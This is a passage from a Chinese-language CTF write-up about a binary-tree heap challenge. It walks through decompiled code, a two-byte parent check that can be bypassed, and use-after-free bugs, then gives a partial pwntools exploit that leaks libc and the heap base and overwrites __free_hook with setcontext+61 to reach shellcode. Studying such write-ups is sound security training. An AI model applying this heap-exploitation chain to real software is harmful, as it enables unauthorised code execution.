          }
        }
        result = (unsigned int)a1->f->val;
        if ( a3 != (_DWORD)result )
        {
          if ( (signed int)a3 >= a1->f->val )
            result = Insert_localalias((node *)&a1->f->ch[1], a2, a3, (__int64)a1->f);
          else
            result = Insert_localalias((node *)a1->f->ch, a2, a3, (__int64)a1->f);
        }
      }
      else
      {
        a1->f = (struct TreeNode *)malloc(0x30uLL);
        a1->f->f = (struct TreeNode *)a4;
        a1->f->val = a3;
        v4 = a1->f;
        result = (__int64)strdup(a2);
        v4->confession = (char *)result;
      }
      return result;
    }
判断节点是否存在，存在直接递归插入子节点，做小右大，不存在申请后直接复赋值。  
exchange函数：
    void Exchange()
    {
      struct TreeNode *v0; // rbx
      int value1; // [rsp+Ch] [rbp-24h]
      int value2; // [rsp+10h] [rbp-20h]
      int opt; // [rsp+14h] [rbp-1Ch]
      node *a1; // [rsp+18h] [rbp-18h]
      puts(&byte_2110);
      value1 = readi();
      puts(&byte_2130);
      value2 = readi();
      opt = readi();
      a1 = find_localalias((node *)root[now], value1);
      v0 = a1->f;
      v0->illegal[isrson(a1, a1->f)] = 1;
      Link_localalias((node *)root[now ^ 1], value2, opt != 0, a1);
    }
函数实现子树间的链接，将子树及其所属子节点全部链接到另一颗子树上，在这个过程中
    void __fastcall Link_localalias(node *a1, unsigned int a2, unsigned int a3, _QWORD *new_son)
    {
      if ( a1 && (unsigned int)check(a1) )
      {
        if ( a2 == a1->val )
        {
          if ( !a1->ch[a3] )
          {
            a1->ch[a3] = (struct TreeNode *)new_son;
            *new_son = a1;
          }
        }
        else if ( (signed int)a2 >= a1->val )
        {
          Link_localalias(a1->ch[1], a2, a3, new_son);
        }
        else
        {
          Link_localalias(a1->ch[0], a2, a3, new_son);
        }
      }
    }
递归link，将新节点link到子树的固定左（0）右（1）子树上，在link之前会检查父节点的孩子结点的父节点是否是自己，不是说明异常，退出
    __int64 __fastcall check(node *a1)
    {
      int i; // [rsp+14h] [rbp-4h]
      for ( i = 0; i ch[i] && (unsigned __int16)a1->ch[i]->f != (_WORD)a1 )
          return 0LL;
      }
      return 1LL;
    }
这里只检查unsigned short类型，只检查两个字节，可以通过对排列来绕过。  
同时，在exchange过程中会存在UAF，在二叉树链接过程中没有将原子树指针置空导致两个子树都可以指向同一个子树节点导致UAF。  
再看dele函数：
    struct TreeNode *__fastcall Dele_localalias(node *a1)
    {
      struct TreeNode *result; // rax
      result = a1->f;
      if ( a1->f )
      {
        result = (struct TreeNode *)check(a1->f);
        if ( (_DWORD)result )
        {
          Dele_localalias((node *)a1->f->ch);
          Dele_localalias((node *)&a1->f->ch[1]);
          free(a1->f->confession);
          free(a1->f);
          result = a1;
          a1->f = 0LL;
        }
      }
      return result;
    }
同样，a1->f->confession没有置空，为二叉树合并链接制造条件，如果置NULL在exchange的时候UAF就不能用了。这里的删除时将子树整体递归free，而不是只删除一个节点。  
菜单选项5是通过异或切换子树,全局变量now控制子树切换。
    .text:0000000000001C49                 lea     rax, now
    .text:0000000000001C50                 mov     eax, [rax]
    .text:0000000000001C52                 xor     eax, 1
    .text:0000000000001C55                 mov     edx, eax
    .text:0000000000001C57                 lea     rax, now
    .text:0000000000001C5E                 mov     [rax], edx
    .text:0000000000001C60                 jmp     short loc_1C78
至此，程序逻辑和漏洞点都理的差不多了
###  利用方式
在find、link、dele的时候都会有检查孩子的父节点是不是当前节点，所以在此之前要通过堆排列进行绕过。
  1. 通过堆排列绕过check，tcache，exchange合并子树，dele其中一个，造成UAF，泄露libc
  2. 通过堆排列绕过check，tcache，exchange造成uaf，free chunk to fastbin 泄露heapbase
  3. 得到free hook、setcontext、mprotect地址
  4. 写入freehook地址，修改free hook为setcontext+61刷新环境（rsp）到堆地址
  5. 通过SOP调用mprotect给内存赋予执行权限，ret跳转到shellcode执行orw读取flag
  6. dele触发shellcode。
传送门：[setcontext](https://github.com/1094093288/IMG/blob/master/Pwn/2021anxunbei/wp.md#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%8F%8A%E5%8A%9F%E8%83%BD)、[SROP](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/#signal)
###  exp
    from pwn import * 
    context.log_level = 'debug'
    context.terminal = ['/bin/tmux', 'split', '-h']
    context.arch = 'amd64'
    sh = process('./leaf')
    #sh = remote('119.45.24.140', 9349)
    libc = ELF('/home/xxx/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/libc.so.6')
    #libc = ELF('./libc-2.31.so')
    def Write(Until, Text, opt = False):
        if not opt:
            sh.sendlineafter(Until, Text)
        else:
            sh.sendafter(Until, Text)
    def Add(confession, val):
        Write('Choice:', '1')
        Write('.', confession, opt = True)
        Write('.', str(val))
    def Dele(val):
        Write('Choice:', '4')
        Write('.', str(val))
    def Exchange(val1, val2, opt):
        Write('Choice:', '2')
        Write('.', str(val1))
        Write('.', str(val2))
        sh.sendline(str(opt))
    def Show(val):
        Write('Choice:', '3')
        Write('.', str(val))
    def Edit(val, Content):
        Write('Choice:', '6')
        Write('?', str(val))
        Write('.', Content, opt = True)
    def Xor():
        Write('Choice:', '5')
    # now = 0
    Add('a', 100)
    Add('a', 200)
    Add('a', 2)
    # make heap chunk to bypass check
    for i in range(16): 
        Add('a' * 0xf00, 3 + i)
    Add('a' * 0x930 + '\x00', 20)
    Add('b\x00', 1)
    for i in range(8):
        Add('a' * 0x80 + '\x00', 201 + i) # 21 - 28
    Xor()
    # now = 1
    Add('a', 1000)
    Xor()
    Dele(1)
    # now = 0
    Exchange(201, 1000, 0)
    Xor()
    # now = 1
    Dele(201)
    Xor()
    # now = 0
    Show(201)
    sh.recvuntil('\n')
    libcbase = u64(sh.recvuntil('\n', drop = True).ljust(8, '\x00')) - libc.symbols['__malloc_hook'] - 0x70
    log.success('libcbase: ' + hex(libcbase))
    Xor()
    # now = 1
    for i in range(9):
        Add('a' * 0x60 + '\x00', 1001 + i)
    for i in range(16):
        Add('a' * 0xf00 + '\x00', 1500 + i)
    Xor()
    # 0
    Add('a' * 0x3c0 + '\x00', 201)
    Xor()
    # 1
    Add('a' * 0x100 + '\x00', 1517)
    for i in range(7): # fill tcache 
        Add('a' * 0x100 + '\x00', 1600 + i)
    Dele(1600)
    Add('a' * 0x300 + '\x00', 5000)
    Add('a' * 0x3c0 + '\x00', 5001) 
    Add('a' * 0x3c0 + '\x00', 5002) 
    Dele(5001)  # tcache[0x3d0]
    Dele(1517)  # free to unsortedbin 
    Xor()
    # now = 0
    # Add('b' * 0x70 + '\x00', 201)
    Exchange(201, 1000, 0)
    Xor()
    # now = 1
    Dele(201)  # note free to fastbin,note's confession to tcache
    Xor()
    # now = 0
    Show(201)
    sh.recvuntil('\n')
    heapbase = u64(sh.recvuntil('\n', drop = True).ljust(8, '\x00')) - 0x21e10
    log.success('heapbase: ' + hex(heapbase))
    #gdb.attach(sh)
    free_hook = libc.symbols['__free_hook'] + libcbase
    magic_addr = libcbase + libc.symbols['setcontext'] + 61
    mprotect_addr = libcbase + libc.symbols['mprotect']
    # Exchange_Addr = libcbase + 0x1547a0
    Exchange_Addr = libcbase + 0x0000000000154930 # context+61
    Edit(201, p64(free_hook)[0:6])
    Add('a' * 0x3c0 + '\x00', 201)
    Add('b' * 0x3c0 + '\x00', 202)
    Edit(202, p64(Exchange_Addr))
    # orw